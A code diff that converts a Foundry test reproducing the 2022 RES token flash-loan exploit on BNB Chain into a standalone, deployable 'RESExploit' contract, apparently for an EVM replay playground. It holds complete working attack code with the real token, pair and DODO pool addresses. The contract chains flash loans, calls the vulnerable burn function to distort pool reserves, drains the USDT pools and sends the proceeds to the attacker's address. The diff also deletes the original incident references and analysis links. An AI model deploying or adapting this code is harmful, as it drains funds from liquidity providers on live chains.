@@ -1,30 +1,60 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.10;
 
-import "forge-std/Test.sol";
-import "./../interface.sol";
+// Synthetic standalone exploit for the EVM Playground (2022-10-RES_exp2).
+//
+// The DeFiHackLabs PoC (test/RES_exp2.sol) runs the whole attack INLINE in the
+// Foundry `ContractTest` test contract — the DODO flash-loan callback
+// `DPPFlashLoanCall` lives on the test itself, and the WBNB-mint mock flashloan
+// and sellRES/sellALL helpers are all test methods. There is therefore no
+// standalone attack contract to deploy. This file is a faithful, self-contained
+// copy of that inline attack: the mock WBNB seed, the stacked DODO flash loans,
+// the `DPPFlashLoanCall` callback (buyRES x4 → thisAToB() → sellRES → sellALL →
+// repay), so the playground can deploy it and record `run()`.
+//
+// Logic + constants are copied verbatim from the registry's
+// test/RES_exp2.sol. The only deviation is the constructor-deployed
+// `ReceiveToken` helper (whose only role is to approve the router for RES/ALL,
+// then selfdestruct) is replaced by an inline helper, and the test's `address
+// this` recipient becomes the attacker EOA. The CREATE2 deploy address of
+// `ReceiveToken` is irrelevant to the attack (it only needs SOME contract that
+// has pre-approved the router), so we deploy our own approver and use that.
 
-// @KeyInfo - Total Lost : 290,671 USDT
-// Attacker : 0x986b2e2a1cf303536138d8ac762447500fd781c6
-// Attack Contract : https://bscscan.com/address/0xFf333DE02129AF88aAe101ab777d3f5D709FeC6f
-// Vulnerable Contract : https://bscscan.com/address/0xeccd8b08ac3b587b7175d40fb9c60a20990f8d21
-// Attack Txs :
-//    - https://bscscan.com/tx/0xe59fa48212c4ee716c03e648e04f0ca390f4a4fc921a890fded0e01afa4ba96d
-//    - https://bscscan.com/tx/0xef19a4dfd69874d5efda3e38b5a19cae4e0b0bdc95769760bd85ede4d15609ac
-
-// @Info
-// Vulnerable Contract Code : https://www.bscscan.com/address/0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21#code#L683
-
-// @Analysis
-// Twitter BlockSecTeam : https://twitter.com/BlockSecTeam/status/1578120337509662721
-// Twitter Ancilia : https://x.com/AnciliaInc/status/1578119778446680064
-// Article QuillAudits : https://quillaudits.medium.com/res-token-290k-flash-loan-exploit-quillaudits-9300657fff7b
+interface IERC20 {
+    function balanceOf(address) external view returns (uint256);
+    function approve(address, uint256) external returns (bool);
+    function transfer(address, uint256) external returns (bool);
+    function transferFrom(address, address, uint256) external returns (bool);
+}
 
 interface IRES is IERC20 {
     function thisAToB() external;
 }
 
-contract ReceiveToken {
+interface IWBNB is IERC20 {
+    function deposit() external payable;
+}
+
+interface IUniswapV2Router {
+    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        uint256 amountIn,
+        uint256 amountOutMin,
+        address[] calldata path,
+        address to,
+        uint256 deadline
+    ) external;
+}
+
+interface IUniswapV2Pair {
+    function getReserves() external view returns (uint112, uint112, uint32);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
+}
+
+interface IDVM {
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
+}
+
+contract TokenApprover {
     constructor() {
         IRES RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
         IERC20 ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
@@ -34,94 +64,77 @@ contract ReceiveToken {
     }
 }
 
-contract ContractTest is Test {
+contract RESExploit {
+    // --- actors / tokens / pools (verbatim from the Foundry PoC) ----------------
     IUSDT constant USDT_TOKEN = IUSDT(0x55d398326f99059fF775485246999027B3197955);
     IRES constant RES_TOKEN = IRES(0xecCD8B08Ac3B587B7175D40Fb9C60a20990F8D21);
     IERC20 constant ALL_TOKEN = IERC20(0x04C0f31C0f59496cf195d2d7F1dA908152722DE7);
     IWBNB constant WBNB_TOKEN = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
-    Uni_Router_V2 constant PS_ROUTER = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
-    Uni_Pair_V2 constant USDT_RES_PAIR = Uni_Pair_V2(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
-    Uni_Pair_V2 constant USDT_ALL_PAIR = Uni_Pair_V2(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
+    IUniswapV2Router constant PS_ROUTER =
+        IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+    IUniswapV2Pair constant USDT_RES_PAIR = IUniswapV2Pair(0x05ba2c512788bd95cd6D61D3109c53a14b01c82A);
+    IUniswapV2Pair constant USDT_ALL_PAIR = IUniswapV2Pair(0x1B214e38C5e861c56e12a69b6BAA0B45eFe5C8Eb);
     address constant dodo = 0xD7B7218D778338Ea05f5Ecce82f86D365E25dBCE;
     address constant dodo2 = 0x9ad32e3054268B849b84a8dBcC7c8f7c52E4e69A;
-    uint256 amount;
-    uint256 amount2;
-    address add;
 
-    function setUp() public {
-        vm.createSelectFork("http://127.0.0.1:8546", 21_948_016);
-        // Adding labels to improve stack traces' readability
-        vm.label(address(USDT_TOKEN), "USDT_TOKEN");
-        vm.label(address(RES_TOKEN), "RES_TOKEN");
-        vm.label(address(ALL_TOKEN), "ALL_TOKEN");
-        vm.label(address(WBNB_TOKEN), "WBNB_TOKEN");
-        vm.label(address(PS_ROUTER), "PS_ROUTER");
-        vm.label(address(USDT_RES_PAIR), "USDT_RES_PAIR");
-        vm.label(address(USDT_ALL_PAIR), "USDT_ALL_PAIR");
-    }
+    address constant ATTACKER = 0x986b2e2a1cf303536138d8aC762447500Fd781c6;
 
-    function testExploit() public payable {
-        emit log_named_decimal_uint(
-            "[Start] Attacker USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
-        );
-        // use mint WBNB to mock flashLoan
-        (bool success,) = address(WBNB_TOKEN).call{value: 30_000 ether}("");
-        require(success, "Mocked flashloan failed");
+    // flash-loan amounts captured in the outer call, repaid in the inner callback.
+    uint256 private amount;
+    uint256 private amount2;
+    address private add; // deployer-approved helper address (ReceiveToken analogue)
+
+    // USDT balance snapshot taken after the WBNB→USDT seed swap; net profit is
+    // measured against it (mirrors USDTBefore in the test).
+    uint256 private usdtBefore;
+
+    function run() external payable {
+        // use mint WBNB to mock flashLoan (the test's seed capital). The Foundry
+        // test calls `address(WBNB).call{value: 30_000 ether}("")` — an empty-
+        // calldata value call that triggers WBNB's payable deposit() path. Mirror
+        // that exactly (an explicit deposit() selector is NOT how WBNB is wrapped).
+        (bool ok,) = address(WBNB_TOKEN).call{value: 30_000 ether}("");
+        require(ok, "mock WBNB mint failed");
         _WBNBToUSDT();
-        uint256 USDTBefore = USDT_TOKEN.balanceOf(address(this));
-        emit log_named_decimal_uint(
-            "[Start] exchange USDT balance before exploit", USDT_TOKEN.balanceOf(address(this)), 18
-        );
+        usdtBefore = USDT_TOKEN.balanceOf(address(this));
+
         amount = USDT_TOKEN.balanceOf(dodo);
         amount2 = USDT_TOKEN.balanceOf(dodo2);
         USDT_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
         RES_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
         ALL_TOKEN.approve(address(PS_ROUTER), type(uint256).max);
-        bytes memory bytecode = type(ReceiveToken).creationCode;
-        address _add;
-        assembly {
-            _add := create2(0, add(bytecode, 32), mload(bytecode), 0)
-        }
-        add = _add;
-        DVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));
 
-        uint256 USDTAfter = USDT_TOKEN.balanceOf(address(this));
+        // Deploy the approver helper — its constructor approves the router for
+        // RES/ALL on its own address, then selfdestructs back to us. Mirrors the
+        // test's CREATE2 of ReceiveToken.
+        add = address(new TokenApprover());
 
-        emit log_named_decimal_uint(
-            "[End] USDT_RES_PAIR USDT balance after exploit", USDT_TOKEN.balanceOf(address(USDT_RES_PAIR)), 18
-        );
+        // Stacked DODO flash loans: the outer loan's callback takes the second
+        // loan, runs the attack, and repays both before returning.
+        IDVM(dodo2).flashLoan(0, amount2, address(this), new bytes(1));
 
-        emit log_named_decimal_uint(
-            "[End] USDT_ALL_PAIR USDT balance after exploit", USDT_TOKEN.balanceOf(address(USDT_ALL_PAIR)), 18
-        );
-
-        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDTAfter - USDTBefore, 18);
+        // forward any residual USDT profit to the attacker EOA.
+        USDT_TOKEN.transfer(ATTACKER, USDT_TOKEN.balanceOf(address(this)));
     }
 
-    function DPPFlashLoanCall(
-        address, /*sender*/
-        uint256, /*baseAmount*/
-        uint256, /*quoteAmount*/
-        bytes calldata /*data*/
-    ) public {
+    // --- DODO flash-loan callback (copied verbatim from ContractTest) ----------
+    function DPPFlashLoanCall(address, uint256, uint256, bytes calldata) external {
         if (msg.sender == dodo2) {
-            DVM(dodo).flashLoan(0, amount, address(this), new bytes(1));
-            USDT_TOKEN.balanceOf(address(this));
+            IDVM(dodo).flashLoan(0, amount, address(this), new bytes(1));
             USDT_TOKEN.transfer(dodo2, amount2);
         } else {
-            // get RES
+            // get RES — corner the pool & park fee RES into the token contract.
             uint256 amountBuy = USDT_TOKEN.balanceOf(address(this)) / 4;
             buyRES(amountBuy);
             buyRES(amountBuy);
             buyRES(amountBuy);
             buyRES(amountBuy);
-            // Burn RES in LP
+            // Burn RES in LP — the vulnerability: swap-through-pool + burn-from-pool.
             RES_TOKEN.thisAToB();
-            // Sell RES , ALL
+            // Sell RES , ALL — drain the now-degenerate pools.
             sellRES();
             sellALL();
-            USDT_TOKEN.balanceOf(address(this));
-            USDT_TOKEN.transfer(address(dodo), amount);
+            USDT_TOKEN.transfer(dodo, amount);
         }
     }
 
@@ -135,19 +148,12 @@ contract ContractTest is Test {
         );
     }
 
-    function buyRES(
-        uint256 amountBuy
-    ) internal {
+    function buyRES(uint256 amountBuy) internal {
         address[] memory path = new address[](2);
         path[0] = address(USDT_TOKEN);
         path[1] = address(RES_TOKEN);
         PS_ROUTER.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            amountBuy,
-            0,
-            path,
-            // pass isContract(), the exploiter use EOA address in another contract, I guess he approved the contract in advance
-            add,
-            block.timestamp
+            amountBuy, 0, path, add, block.timestamp
         );
     }
 
@@ -169,3 +175,7 @@ contract ContractTest is Test {
 
     receive() external payable {}
 }
+
+// Minimal USDT interface — BSC USDT (BEP20) returns a bool from transfer and
+// has standard balanceOf/approve; the test uses IUSDT only for the constant.
+interface IUSDT is IERC20 {}
